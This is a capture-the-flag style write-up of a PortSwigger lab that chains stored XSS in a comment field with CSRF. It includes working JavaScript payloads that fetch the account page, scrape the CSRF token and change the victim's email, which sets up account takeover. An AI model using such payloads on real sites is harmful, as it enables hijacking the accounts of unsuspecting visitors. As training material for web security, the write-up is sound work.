# Exploiting XSS to perform CSRF

## Description

Link : https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf

>![](imgs/20210701-200938.png)


## Writeup

We log in as the **wiener** user and we are redirected to our account page (`/my-account`):

>![](imgs/20210701-201401.png)

The page exposes a `update email` functionality and it is protected by a CSRF token.

We can use Burp to intercept the HTTP requests and to understand the `update email` mechanism in detail.

We change the email to **luca@normal-user.net** and here is the request:

>![](imgs/20210701-202035.png)


The email and the CSRF token are sent in the POST data after being urlencoded. Given that the request is protected by a CSRF token it is necessary to provide a valid token in order for the request to be valid.  
This is where the XSS comes handy: if we manage to execute javascript in the user's context, we will be able to dynamically scrape the valid CSRF token from the page and submit it together with the email.

Let's look for the XSS then.

The XSS can be easily spotted by testing the trivial `<script>` tag on the _comment_ text area

>![](imgs/20210701-203757.png)

And Javascript is executed.

>![](imgs/20210701-203902.png)


We can now use the XSS to bypass the CSRF protection and perform a CSRF attack in order to change the password of the users who will visit the page where the XSS is stored.  
Since the mail is changed with a POST request, we need to trick the user to perform a POST request to the `/my-account/change-email` endpoint, submitting the new email and the valid CSRF token.  


We wrote some lines of Javascript for the purpose (i.e. our XSS payload).  
`email` and `csrf` token should be urlencoded in order to conform to the POST data format we previously observed in Burp:

```
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', '/my-account/change-email', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send(new URLSearchParams({
    'email': 'pwned@gmail.com',
    'csrf': document.getElementsByName('csrf')[0].value
    })
    );
</script>
```

However it is not successful.  
Taking some steps back to spot the issue, we notice that the CSRF token is only issued after the user visits the account page, namely `/my-account`. Such behavior caused the `document.getElementsByName('csrf')[0].value` to be null, as the token was not there yet.

We can easily fix the issue by first issuing a request to `/my-account` and scraping the CSRF token from the response. Therefore, our new XSS payload looks like:



```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.onload = function() { 
        var token = this.response.getElementsByName('csrf')[0].value;
	xhr.open('POST', '/my-account/change-email', true);
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xhr.send(new URLSearchParams({
	    'email': 'pwned@gmail.com',
	    'csrf': token
	    })
	    );
};
xhr.open('GET', '/my-account', true);
xhr.responseType = "document";
xhr.send();

</script>
```

Some notes on the code:

- When `this` is used in the context of a DOM event handler, it is set to the element on which the listener is placed (`xhr` in this case).
- The `onload` event triggers when the response is fully loaded
- We prepare the `onload`event handler before the request to `my-account` takes place to make sure that the handler will be ready.

We completed the lab successfully. Now every users who will visit the page where our XSS is stored will have the email changed to `pwned@gmail.com`.






